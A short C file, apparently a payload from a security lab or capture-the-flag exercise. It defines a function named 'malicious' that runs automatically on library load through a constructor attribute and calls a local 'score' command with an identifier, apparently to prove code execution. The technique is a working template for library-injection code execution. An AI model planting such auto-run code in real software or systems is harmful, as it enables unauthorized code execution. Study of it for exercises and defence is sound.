#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
  system("/usr/local/bin/score e39cdb59-92a6-4d2d-bff4-2ca2b65b40dc");
}